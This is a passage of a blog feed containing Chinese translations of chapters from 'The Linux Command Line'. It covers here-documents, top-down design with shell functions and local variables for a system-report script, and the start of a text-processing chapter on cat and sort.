class="string">_EOF_</span></span><br><span class="line"><span class="built_in">ls</span> -l <span class="string">&quot;<span class="variable">$REMOTE_FILE</span>&quot;</span></span><br></pre></td></tr></table></figure>

<p>如果我们将重定向操作符从 &lt;&lt; 改为 &lt;&lt;-，shell 将忽略这里文档中的前导制表符（但不是空格）。这允许这里文档被缩进，这可以提高可读性。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># 脚本通过 FTP 检索文件</span></span><br><span class="line">FTP_SERVER=ftp.nl.debian.org</span><br><span class="line">FTP_PATH=/debian/dists/stretch/main/installer-amd64/current/images/</span><br><span class="line">REMOTE_FILE=debian-cd_info.tar.gz</span><br><span class="line">ftp -n &lt;&lt;- <span class="string">_EOF_</span></span><br><span class="line"><span class="string">open $FTP_SERVER</span></span><br><span class="line"><span class="string">user anonymous me@linuxbox</span></span><br><span class="line"><span class="string">cd $FTP_PATH</span></span><br><span class="line"><span class="string">hash</span></span><br><span class="line"><span class="string">get $REMOTE_FILE</span></span><br><span class="line"><span class="string">bye</span></span><br><span class="line"><span class="string">_EOF_</span></span><br><span class="line"><span class="built_in">ls</span> -l <span class="string">&quot;<span class="variable">$REMOTE_FILE</span>&quot;</span></span><br></pre></td></tr></table></figure>

<p>这个特性有些问题，因为许多文本编辑器（和程序员本身）会倾向于使用空格而不是制表符来实现脚本的缩进。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>在本章中，我们开始了一个项目，将引导我们完成构建成功脚本的过程</p>
<p>。我们介绍了变量和常量的概念以及如何使用它们。它们是我们将会发现的许多参数扩展应用的第一批。我们还研究了如何从脚本中产生输出以及嵌入文本块的各种方法。</p>
<h3 id="进一步阅读"><a href="#进一步阅读" class="headerlink" title="进一步阅读"></a>进一步阅读</h3><ul>
<li><p>有关 HTML 的更多信息，请参阅以下文章和教程：</p>
<p><span class="exturl" data-url="aHR0cDovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9IdG1s">http://en.wikipedia.org/wiki/Html<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cDovL2VuLndpa2lib29rcy5vcmcvd2lraS9IVE1MX1Byb2dyYW1taW5n">http://en.wikibooks.org/wiki/HTML_Programming<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cDovL2h0bWwubmV0L3R1dG9yaWFscy9odG1sLw==">http://html.net/tutorials/html/<i class="fa fa-external-link-alt"></i></span></p>
</li>
<li><p>bash 手册页包含一个名为“这里文档”的部分，其中有此功能的完整描述。</p>
</li>
</ul>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>TLCL</tag>
      </tags>
  </entry>
  <entry>
    <title>自顶向下设计</title>
    <url>/2024/05/26-top-down-design/</url>
    <content><![CDATA[<h2 id="26-–-自顶向下设计"><a href="#26-–-自顶向下设计" class="headerlink" title="26 – 自顶向下设计"></a>26 – 自顶向下设计</h2><p>随着程序变得越来越大和复杂，它们变得越来越难以设计、编码和维护。如同任何大型项目，将大型复杂任务分解为一系列小型简单任务通常是个好主意。让我们想象一下，我们正在尝试向来自火星的人描述一个常见的日常任务，去市场购买食物。我们可能会将整个过程描述为以下一系列步骤：</p>
<span id="more"></span>

<ol>
<li>上车。</li>
<li>驾车前往市场。</li>
<li>停车。</li>
<li>进入市场。</li>
<li>购买食物。</li>
<li>返回车辆。</li>
<li>驾车回家。</li>
<li>停车。</li>
<li>进入房屋。</li>
</ol>
<p>然而，来自火星的人可能需要更多的细节。我们可以进一步将子任务“停车”分解为以下一系列步骤：</p>
<ol>
<li>寻找停车位。</li>
<li>将车驶入停车位。</li>
<li>关闭引擎。</li>
<li>设置停车制动。</li>
<li>离开车辆。</li>
<li>锁车。</li>
</ol>
<p>“关闭引擎”的子任务进一步可以分解为包括“关闭点火开关”、“取出点火钥匙”等步骤，直到去市场的整个过程的每一步都被完全定义。</p>
<p>这个过程，识别顶层步骤并逐步详细查看这些步骤，被称为<em>自顶向下设计</em>。这种技术允许我们将大型复杂任务分解为许多小型简单任务。自顶向下设计是设计程序的一种常见方法，特别适用于shell编程。</p>
<p>在本章中，我们将使用自顶向下设计来进一步开发我们的报告生成脚本。</p>
<h3 id="Shell函数"><a href="#Shell函数" class="headerlink" title="Shell函数"></a>Shell函数</h3><p>我们的脚本目前执行以下步骤来生成HTML文档：</p>
<ol>
<li>打开页面。</li>
<li>打开页面头部。</li>
<li>设置页面标题。</li>
<li>关闭页面头部。</li>
<li>打开页面主体。</li>
<li>输出页面标题。</li>
<li>输出时间戳。</li>
<li>关闭页面主体。</li>
<li>关闭页面。</li>
</ol>
<p>对于我们下一阶段的开发，我们将在第7步和第8步之间添加一些任务。这些将包括以下内容：</p>
<ul>
<li><p>系统运行时间和负载。这是自上次关机或重启以来的时间以及在几个时间间隔内当前在处理器上运行的任务的平均数量。</p>
</li>
<li><p>磁盘空间。这是系统存储设备上空间的总体使用情况。</p>
</li>
<li><p>家目录空间。这是每个用户使用的存储空间量。</p>
</li>
</ul>
<p>如果我们有一个命令用于这些任务，我们可以通过命令替换简单地将它们添加到我们的脚本中。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># 程序输出系统信息页面</span></span><br><span class="line">TITLE=<span class="string">&quot;系统信息报告 <span class="variable">$HOSTNAME</span>&quot;</span></span><br><span class="line">CURRENT_TIME=<span class="string">&quot;<span class="subst">$(date +<span class="string">&quot;%x %r %Z&quot;</span>)</span>&quot;</span></span><br><span class="line">TIMESTAMP=<span class="string">&quot;由 <span class="variable">$USER</span> 在 <span class="variable">$CURRENT_TIME</span> 生成&quot;</span></span><br><span class="line"><span class="built_in">cat</span> &lt;&lt; <span class="string">_EOF_</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string"> &lt;head&gt;</span></span><br><span class="line"><span class="string"> 	&lt;title&gt;$TITLE&lt;/title&gt;</span></span><br><span class="line"><span class="string"> &lt;/head&gt;</span></span><br><span class="line"><span class="string"> &lt;body&gt;</span></span><br><span class="line"><span class="string"> 	&lt;h1&gt;$TITLE&lt;/h1&gt;</span></span><br><span class="line"><span class="string"> 	&lt;p&gt;$TIMESTAMP&lt;/p&gt;</span></span><br><span class="line"><span class="string"> 	$(report_uptime)</span></span><br><span class="line"><span class="string"> 	$(report_disk_space)</span></span><br><span class="line"><span class="string"> 	$(report_home_space)</span></span><br><span class="line"><span class="string"> &lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">_EOF_</span></span><br></pre></td></tr></table></figure>

<p>我们可以通过两种方式创建这些额外的命令。我们可以编写三个单独的脚本并将它们放置在我们的PATH中列出的目录中，或者我们可以将脚本嵌入到我们的程序中作为<em>shell函数</em>。正如我们提到的，shell函数是位于其他脚本内部的“小型脚本”，可以作为自治程序。Shell函数有两种语法形式。首先，这是更正式的形式：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> name &#123;</span><br><span class="line">	commands</span><br><span class="line">	<span class="built_in">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这是一个更简单（通常是首选）的形式：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">name</span></span> () &#123;</span><br><span class="line">	commands</span><br><span class="line">	<span class="built_in">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中<em>name</em>是函数的名称，<em>commands</em>是函数内包含的一系列命令。两种形式是等效的，可以互换使用。以下是演示shell函数使用的脚本：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1 <span class="comment">#!/bin/bash</span></span><br><span class="line">2</span><br><span class="line">3 <span class="comment"># Shell函数演示</span></span><br><span class="line">4</span><br><span class="line">5 <span class="keyword">function</span> step2 &#123;</span><br><span class="line">6 	<span class="built_in">echo</span> <span class="string">&quot;步骤 2&quot;</span></span><br><span class="line">7 	<span class="built_in">return</span></span><br><span class="line">8 &#125; </span><br><span class="line">9</span><br><span class="line">10 <span class="comment"># 主程序从这里开始</span></span><br><span class="line">11</span><br><span class="line">12 <span class="built_in">echo</span> <span class="string">&quot;步骤 1&quot;</span></span><br><span class="line">13 step2</span><br><span class="line">14 <span class="built_in">echo</span> <span class="string">&quot;步骤 3&quot;</span></span><br></pre></td></tr></table></figure>

<p>当shell读取脚本时，它会跳过第1行到第11行，因为这些行由注释和函数定义组成。执行从第12行开始，使用echo命令。第13行<em>调用</em>了shell函数step2，shell就像执行任何其他命令一样执行该函数。程序控制然后移动到第6行，并执行第二个echo命令。接下来执行第7行。它的return命令终止了函数并将控制权返回给程序在函数调用之后的行（第14行），并执行了最后一个echo命令。注意，为了使函数调用被识别为shell函数而不是解释为外部程序的名称，shell函数定义必须在它们被调用之前出现在脚本中。</p>
<p>我们将在我们的脚本中添加最小的shell函数定义，如下所示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># 程序输出系统信息页面</span></span><br><span class="line">TITLE=<span class="string">&quot;系统信息报告 <span class="variable">$HOSTNAME</span>&quot;</span></span><br><span class="line">CURRENT_TIME=<span class="string">&quot;<span class="subst">$(date +<span class="string">&quot;%x %r %Z&quot;</span>)</span>&quot;</span></span><br><span class="line">TIMESTAMP=<span class="string">&quot;由 <span class="variable">$USER</span> 在 <span class="variable">$CURRENT_TIME</span> 生成&quot;</span></span><br><span class="line"><span class="function"><span class="title">report_uptime</span></span> () &#123;</span><br><span class="line">	<span class="built_in">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="title">report_disk_space</span></span> () &#123;</span><br><span class="line">	<span class="built_in">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="title">report_home_space</span></span> () &#123;</span><br><span class="line">	<span class="built_in">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cat</span> &lt;&lt; <span class="string">_EOF_</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">	&lt;head&gt;</span></span><br><span class="line"><span class="string">		&lt;title&gt;$TITLE&lt;/title&gt;</span></span><br><span class="line"><span class="string">	&lt;/head&gt;</span></span><br><span class="line"><span class="string">	&lt;body&gt;</span></span><br><span class="line"><span class="string">		&lt;h1&gt;$TITLE&lt;/h1&gt;</span></span><br><span class="line"><span class="string">		&lt;p&gt;$TIMESTAMP&lt;/p&gt;</span></span><br><span class="line"><span class="string">    $(report_uptime)</span></span><br><span class="line"><span class="string">    $(report_disk_space)</span></span><br><span class="line"><span class="string">    $(report_home_space)</span></span><br><span class="line"><span class="string">	&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">_EOF_</span> </span><br></pre></td></tr></table></figure>

<p>Shell函数名称遵循与变量相同的规则。函数必须包含至少一个命令。return命令（可选的）满足了要求。</p>
<h3 id="局部变量"><a href="#局部变量" class="headerlink" title="局部变量"></a>局部变量</h3><p>到目前为止，我们编写的脚本中所有的变量（包括常量）都是<em>全局变量</em>。全局变量在整个程序中保持存在。这对许多事情来说是没问题的，但有时它会使得使用shell函数变得复杂。在shell函数内部，通常希望有<em>局部变量</em>。局部变量只能在定义它们的shell函数内部访问，并且一旦shell函数终止就不再存在。</p>
<p>拥有局部变量允许程序员使用可能已经存在的变量名，无论是在全局脚本中还是在其他shell函数中，而不必担心潜在的名称冲突。</p>
<p>这是一个演示如何定义和使用局部变量的示例脚本：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># local-vars: 脚本演示局部变量</span></span><br><span class="line">foo=0 <span class="comment"># 全局变量 foo</span></span><br><span class="line"><span class="function"><span class="title">funct_1</span></span> () &#123;</span><br><span class="line">	<span class="built_in">local</span> foo <span class="comment"># 变量 foo 局部于 funct_1</span></span><br><span class="line">	foo=1</span><br><span class="line">	<span class="built_in">echo</span> <span class="string">&quot;funct_1: foo = <span class="variable">$foo</span>&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">funct_2</span></span> () &#123;</span><br><span class="line">	<span class="built_in">local</span> foo <span class="comment"># 变量 foo 局部于 funct_2</span></span><br><span class="line">	foo=2</span><br><span class="line">	<span class="built_in">echo</span> <span class="string">&quot;funct_2: foo = <span class="variable">$foo</span>&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;global: foo = <span class="variable">$foo</span>&quot;</span></span><br><span class="line">funct_1</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;global: foo = <span class="variable">$foo</span>&quot;</span></span><br><span class="line">funct_2</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;global: foo = <span class="variable">$foo</span>&quot;</span></span><br></pre></td></tr></table></figure>

<p>我们可以看到，局部变量是通过在变量名前加上单词local来定义的。这创建了一个局部于定义它的shell函数的变量。一旦离开shell函数，变量就不再存在。当我们运行这个脚本时，我们看到这些结果：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ local-vars</span><br><span class="line">global: foo = 0</span><br><span class="line">funct_1: foo = 1</span><br><span class="line">global: foo = 0</span><br><span class="line">funct_2: foo = 2</span><br><span class="line">global: foo = 0</span><br></pre></td></tr></table></figure>

<p>我们看到，在两个shell函数内对局部变量foo的赋值对外部函数定义的foo的值没有影响。</p>
<p>这个特性允许shell函数被编写为它们彼此独立以及与它们所在的脚本独立。这是有价值的，因为它有助于防止程序的一部分干扰另一部分。它也允许shell函数被编写成可移植的。也就是说，它们可以根据需要从一个脚本剪切并粘贴到另一个脚本。</p>
<h3 id="保持脚本运行"><a href="#保持脚本运行" class="headerlink" title="保持脚本运行"></a>保持脚本运行</h3><p>在开发我们的程序时，保持程序处于可运行状态是有用的。通过这样做，并且频繁测试，我们可以在开发过程的早期检测错误。这将使得调试问题变得更加容易。例如，如果我们运行程序，做了一个小改动，然后再次运行程序并发现一个问题，很可能最近的改动是问题的来源。通过添加空函数，程序员语中称为<em>存根</em>，我们可以在早期阶段验证我们程序的逻辑流程。构建存根时，最好包括一些为程序员提供反馈的内容，显示逻辑流程正在执行。如果我们现在查看我们脚本的输出：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ sys_info_page</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;<span class="built_in">head</span>&gt;</span><br><span class="line">	  &lt;title&gt;系统信息报告 linuxbox&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  	&lt;h1&gt;系统信息报告 linuxbox&lt;/h1&gt;</span><br><span class="line">	  &lt;p&gt;于 03/19/2009 04:02:10 PM EDT 生成, 由 me&lt;/p&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>我们看到我们的输出后面有一些空行，但我们不能确定原因。如果我们改变函数以包含一些反馈：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">report_uptime</span></span> () &#123;</span><br><span class="line"> <span class="built_in">echo</span> <span class="string">&quot;函数 report_uptime 执行</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">。&quot;</span></span><br><span class="line"> <span class="built_in">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="title">report_disk_space</span></span> () &#123;</span><br><span class="line"> <span class="built_in">echo</span> <span class="string">&quot;函数 report_disk_space 执行。&quot;</span></span><br><span class="line"> <span class="built_in">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="title">report_home_space</span></span> () &#123;</span><br><span class="line"> <span class="built_in">echo</span> <span class="string">&quot;函数 report_home_space 执行。&quot;</span></span><br><span class="line"> <span class="built_in">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>并再次运行脚本：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ sys_info_page</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;<span class="built_in">head</span>&gt;</span><br><span class="line">  	&lt;title&gt;系统信息报告 linuxbox&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;h1&gt;系统信息报告 linuxbox&lt;/h1&gt;</span><br><span class="line">    &lt;p&gt;于 03/20/2009 05:17:26 AM EDT 生成, 由 me&lt;/p&gt;</span><br><span class="line">    函数 report_uptime 执行。</span><br><span class="line">    函数 report_disk_space 执行。</span><br><span class="line">    函数 report_home_space 执行。</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>我们现在看到，事实上，我们的三个函数正在执行。</p>
<p>有了我们的函数框架就位并且工作，是时候充实一些函数代码了。首先，这是report_uptime函数：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">report_uptime</span></span> () &#123;</span><br><span class="line">  <span class="built_in">cat</span> &lt;&lt;- <span class="string">_EOF_</span></span><br><span class="line"><span class="string">    &lt;h2&gt;系统运行时间&lt;/h2&gt;</span></span><br><span class="line"><span class="string">    &lt;pre&gt;$(uptime)&lt;/pre&gt;</span></span><br><span class="line"><span class="string">    _EOF_</span></span><br><span class="line">  <span class="built_in">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>它相当直接。我们使用这里的文档来输出一个节标题和uptime命令的输出，用<code>&lt;pre&gt;</code>标签包围以保留命令的格式。report_disk_space函数类似。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">report_disk_space</span></span> () &#123;</span><br><span class="line">  <span class="built_in">cat</span> &lt;&lt;- <span class="string">_EOF_</span></span><br><span class="line"><span class="string">    &lt;h2&gt;磁盘空间使用情况&lt;/h2&gt;</span></span><br><span class="line"><span class="string">    &lt;pre&gt;$(df -h)&lt;/pre&gt;</span></span><br><span class="line"><span class="string">    _EOF_</span></span><br><span class="line">  <span class="built_in">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个函数使用df -h命令来确定磁盘空间量。最后，我们将构建report_home_space函数。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">report_home_space</span></span> () &#123;</span><br><span class="line">  <span class="built_in">cat</span> &lt;&lt;- <span class="string">_EOF_</span></span><br><span class="line"><span class="string">    &lt;h2&gt;家目录空间使用情况&lt;/h2&gt;</span></span><br><span class="line"><span class="string">    &lt;pre&gt;$(du -sh /home/*)&lt;/pre&gt;</span></span><br><span class="line"><span class="string">    _EOF_</span></span><br><span class="line">  <span class="built_in">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们使用du命令和-sh选项来执行这项任务。然而，这并不是解决问题的完整解决方案。虽然它在一些系统上（例如Ubuntu）会工作，但在其他系统上不会。原因是许多系统设置了家目录权限，以防止它们被设置为对世界可读，这是一个合理的安全措施。在这些系统上，如编写的report_home_space函数只有在我们的脚本以超级用户权限运行时才会工作。更好的解决方案将是让脚本根据用户的权限调整其行为。我们将在下一章中讨论这个问题。</p>
<p><strong>在你的</strong> <strong>.bashrc</strong> <strong>文件中使用Shell函数</strong></p>
<p>Shell函数是替代别名的绝佳选择，并且实际上是为个人使用创建小命令的首选方法。别名在它们支持的命令和shell特性方面是有限的，而shell函数允许任何可以被脚本化的事物。例如，如果我们喜欢我们为脚本开发的report_disk_space shell函数，我们可以为我们的.bashrc文件创建一个类似的名为ds的函数：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">ds</span></span> () &#123;</span><br><span class="line">	<span class="built_in">echo</span> “磁盘空间使用情况 <span class="variable">$HOSTNAME</span>”</span><br><span class="line">	<span class="built_in">df</span> -h</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>在这一章中，我们介绍了一种常见的程序设计方法称为自顶向下设计，我们看到了shell函数是如何被用来构建它所需的逐步细化。我们还看到了如何使用局部变量使shell函数彼此独立以及与它们放置的程序独立。这使得shell函数可以以可移植的方式编写，并且可以通过允许它们被放置在多个程序中来<em>重用</em>；这是一个伟大的时间节省器。</p>
<h3 id="进一步阅读"><a href="#进一步阅读" class="headerlink" title="进一步阅读"></a>进一步阅读</h3><ul>
<li><p>维基百科上有许多关于软件设计哲学的文章。以下是一些不错的文章：</p>
<p><span class="exturl" data-url="aHR0cDovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9Ub3AtZG93bl9kZXNpZ24=">自顶向下设计<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cDovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9TdWJyb3V0aW5lcw==">子程序<i class="fa fa-external-link-alt"></i></span></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>TLCL</tag>
      </tags>
  </entry>
  <entry>
    <title>文本处理</title>
    <url>/2024/04/20-text-processing/</url>
    <content><![CDATA[<h2 id="20-文本处理"><a href="#20-文本处理" class="headerlink" title="20 - 文本处理"></a>20 - 文本处理</h2><p>所有类Unix操作系统都严重依赖文本文件进行数据存储。因此，存在许多用于操作文本的工具是有道理的。在本章中，我们将看看用于“切割和处理”文本的程序。在下一章中，我们将继续探讨文本处理，重点是用于格式化文本以供打印和其他类型人类消费的程序。</p>
<p>本章将重温一些老朋友，并向我们介绍一些新朋友：</p>
<span id="more"></span>

<ul>
<li>cat - 连接文件并在标准输出上打印</li>
<li>sort - 对文本文件的行进行排序</li>
<li>uniq - 报告或忽略重复的行</li>
<li>cut - 从文件的每一行中删除部分</li>
<li>paste - 合并文件的行</li>
<li>join - 在一个公共字段上连接两个文件的行</li>
<li>comm - 逐行比较两个排序的文件</li>
<li>diff - 逐行比较文件</li>
<li>patch - 将差异文件应用于原始文件</li>
<li>tr - 转换或删除字符</li>
<li>sed - 用于过滤和转换文本的流编辑器</li>
<li>aspell - 交互式拼写检查器</li>
</ul>
<h3 id="文本的应用"><a href="#文本的应用" class="headerlink" title="文本的应用"></a>文本的应用</h3><p>到目前为止，我们已经学习了一些文本编辑器（nano和vim），查看了许多配置文件，并且见证了数十个命令的输出，全部以文本形式。但是文本还用于什么呢？事实证明，用途非常多。</p>
<h4 id="文档"><a href="#文档" class="headerlink" title="文档"></a>文档</h4><p>许多人使用纯文本格式编写文档。虽然很容易看出一个小文本文件对于保留简单笔记是有用的，但也完全可能以文本格式编写大型文档。一种流行的方法是以文本格式编写大型文档，然后嵌入<em>标记语言</em>来描述最终文档的格式。许多科学论文都是使用这种方法编写的，因为基于Unix的文本处理系统是最早支持技术领域作家所需的高级排版布局的系统之一。</p>
<h4 id="网页"><a href="#网页" class="headerlink" title="网页"></a>网页</h4><p>世界上最流行的电子文档类型可能是网页。网页是使用<em>超文本标记语言</em>（<em>HTML</em>）或<em>可扩展标记语言</em>（<em>XML</em>）作为标记语言的文本文档，用来描述文档的视觉格式。</p>
<h4 id="电子邮件"><a href="#电子邮件" class="headerlink" title="电子邮件"></a>电子邮件</h4><p>电子邮件是一种本质上基于文本的媒介。即使是非文本附件也会被转换为文本表示形式进行传输。我们可以通过下载一封电子邮件消息然后在less中查看它来亲自看到。我们会看到消息以描述消息来源和它在传输过程中接收到的处理的<em>头部</em>开始，然后是包含其内容的消息<em>正文</em>。</p>
<h4 id="打印机输出"><a href="#打印机输出" class="headerlink" title="打印机输出"></a>打印机输出</h4><p>在类Unix系统上，发送给打印机的输出以纯文本发送，或者，如果页面包含图形，则转换为称为<em>PostScript</em>的文本格式<em>页面描述语言</em>，然后发送给生成要打印的图形点的程序。</p>
<h4 id="程序源代码"><a href="#程序源代码" class="headerlink" title="程序源代码"></a>程序源代码</h4><p>许多在类Unix系统上找到的命令行程序是为了支持系统管理和软件开发而创建的，文本处理程序也不例外。它们中的许多都是为了解决软件开发问题而设计的。文本处理对软件开发人员很重要的原因是所有软件都是以文本开始的。<em>源代码</em>，程序员实际编写的部分，始终是文本格式的。</p>
<h3 id="重访一些老朋友"><a href="#重访一些老朋友" class="headerlink" title="重访一些老朋友"></a>重访一些老朋友</h3><p>回到第6章，“重定向”，我们学习了一些能够接受标准输入以及</p>
<p>命令行参数的命令。那时我们只是简单地触及它们，但现在我们将更仔细地看看它们如何用于进行文本处理。</p>
<h4 id="cat"><a href="#cat" class="headerlink" title="cat"></a>cat</h4><p>cat程序有许多有趣的选项。其中许多用于帮助更好地可视化文本内容。一个例子是-A选项，用于显示文本中的不可打印字符。有时我们想知道控制字符是否嵌入在我们的可见文本中。最常见的是制表符（与空格相对）和回车符，通常作为MS-DOS样式文本文件中的行尾字符出现。另一个常见情况是包含尾随空格的文本行中的文本文件。</p>
<p>让我们使用cat作为原始文字处理器来创建一个测试文件。为此，我们只需输入cat命令（连同指定用于重定向输出的文件）并键入我们的文本，然后按Enter以正确结束该行，然后Ctrl-d，以指示给cat我们已达到文件末尾。在这个例子中，我们输入一个前导制表符，然后在行后跟一些尾随空格：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">cat</span> &gt; foo.txt</span><br><span class="line">The quick brown fox jumped over the lazy dog.</span><br><span class="line">[me@linuxbox ~]$ </span><br></pre></td></tr></table></figure>

<p>接下来，我们将使用cat的-A选项来显示文本：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">cat</span> -A foo.txt</span><br><span class="line">^IThe quick brown fox jumped over the lazy dog. $</span><br><span class="line">[me@linuxbox ~]$ </span><br></pre></td></tr></table></figure>

<p>如我们在结果中看到的，我们文本中的制表符由^I表示。这是一个常见的表示方法，意思是Ctrl-i，正如事实证明，与制表符相同。我们还看到行的真正结束处出现了一个$，表明我们的文本包含尾随空格。</p>
<h3 id="MS-DOS文本与Unix文本"><a href="#MS-DOS文本与Unix文本" class="headerlink" title="MS-DOS文本与Unix文本"></a>MS-DOS文本与Unix文本</h3><p>您可能想使用cat来查找文本中的不可打印字符的原因之一是要发现隐藏的回车符。隐藏的回车符从哪里来的？DOS和Windows！Unix和DOS在文本文件中不以相同的方式定义行的结束。Unix以换行符（ASCII 10）结束一行，而MSDOS及其衍生物使用回车符（ASCII 13）和换行符的序列来终止每一行文本。</p>
<p>有几种方法可以将文件从DOS转换为Unix格式。在许多Linux系统上，有名为dos2unix和unix2dos的程序，可以将文本文件转换为DOS格式及其反向转换。然而，如果你的系统上没有dos2unix，也不用担心。将文本从DOS转换为Unix格式的过程很简单；它涉及到删除冒犯的回车符。这很容易通过本章后面讨论的几个程序来完成。</p>
<p>cat还有一些用于修改文本的选项。两个最主要的是-n，它为行编号，和-s，它抑制多个空行的输出。我们可以这样演示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">cat</span> &gt; foo.txt</span><br><span class="line">The quick brown fox</span><br><span class="line">jumped over the lazy dog.</span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">cat</span> -ns foo.txt</span><br><span class="line"> 1 The quick brown fox</span><br><span class="line"> 2</span><br><span class="line"> 3 jumped over the lazy dog.</span><br><span class="line">[me@linuxbox ~]$ </span><br></pre></td></tr></table></figure>

<p>在这个例子中，我们创建了我们的foo.txt测试文件的新版本，其中包含两行文本，由两个空行分隔。经过带有-ns选项的cat处理后，多余的空行被移除，剩下的行被编号。虽然这对文本进行的处理不多，但它确实是一个过程。</p>
<h4 id="sort"><a href="#sort" class="headerlink" title="sort"></a>sort</h4><p>sort程序对标准输入的内容或命令行上指定的一个或多个文件进行排序，并将结果发送到标准输出。使用我们之前与cat一起使用的技术，我们可以按如下方式直接从键盘演示标准输入的处理：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">sort</span> &gt; foo.txt</span><br><span class="line">c</span><br><span class="line">b</span><br><span class="line">a</span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">cat</span> foo.txt</span><br><span class="line">a</span><br><span class="line">b</span><br><span class="line">c</span><br></pre></td></tr></table></figure>

<p>输入命令后，我们键入字母c、b和a，然后按Ctrl-d表示文件结束。然后我们查看结果文件，看到行现在以排序顺序出现。</p>
<p>由于sort可以在命令行上接受多个文件作为参数，因此可以将多个文件<em>合并</em>成一个单一排序的整体。例如，如果我们有三个文本文件并希望将它们合并成一个单一的排序文件，我们可以这样做：</p>
<blockquote>
<p>sort file1.txt file2.txt file3.txt &gt; final_sorted_list.txt</p>
</blockquote>
<p>sort有几个有趣的选项。表20-1包含了一个部分列表：</p>
<p><em>表20-1: 常见的</em> <em>sort选项</em></p>
<table>
<thead>
<tr>
<th><strong>选项</strong></th>
<th><strong>长选项</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td>-b</td>
<td>–ignore-leading-blanks</td>
<td>默认情况下，排序是基于整行进行的，从行中的第一个字符开始。此选项使sort忽略行首的空格，并基于行中的第一个非空白字符计算排序。</td>
</tr>
<tr>
<td>-f</td>
<td>–ignore-case</td>
<td>使排序不区分大小写。</td>
</tr>
<tr>
<td>-n</td>
<td>–numeric-sort</td>
<td>基于字符串的数值评估执行排序。使用此选项允许根据数值而不是字母值进行排序。</td>
</tr>
